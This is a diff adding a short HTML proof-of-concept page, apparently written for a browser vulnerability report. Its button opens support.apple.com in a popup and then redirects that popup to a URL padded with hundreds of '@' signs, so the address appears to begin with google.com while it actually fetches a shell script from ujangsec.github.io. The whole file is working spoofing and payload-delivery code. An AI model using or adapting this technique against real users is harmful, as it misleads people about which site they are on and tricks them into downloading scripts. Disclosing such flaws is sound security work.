@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>PoC</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 20px;
+      font-family: Arial, sans-serif;
+      background: #f0f0f0;
+      text-align: center;
+    }
+    .trigger-btn {
+      display: inline-block;
+      padding: 15px 30px;
+      background: #ff4444;
+      color: white;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+      margin-top: 50px;
+      border: none;
+    }
+    .trigger-btn:hover { background: #cc0000; }
+  </style>
+</head>
+<body>
+  <h2>Click the Button to Trigger Prompt</h2>
+  <p>Click the button below to simulate the popup + redirect sequence.</p>
+
+  <button class="trigger-btn" onclick="triggerSpoof()">Click Here!</button>
+
+  <script>
+    function triggerSpoof() {
+      // Step 1: Open a legit domain (support.apple.com) in a new window/tab
+      // Using a direct click event improves popup success vs. hover.
+      var w = window.open('https://support.apple.com');
+
+      // Step 2: After a short delay, redirect that window to an obfuscated URL
+      var targetUrl = 'https://google.com@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ujangsec.github.io/y.zsh';
+
+      setTimeout(function () {
+        if (w && !w.closed) {
+          // Redirect the newly opened window
+          w.location = targetUrl;
+        } else {
+          // Fallback: if popup was blocked, redirect current window instead
+          window.location = targetUrl;
+        }
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
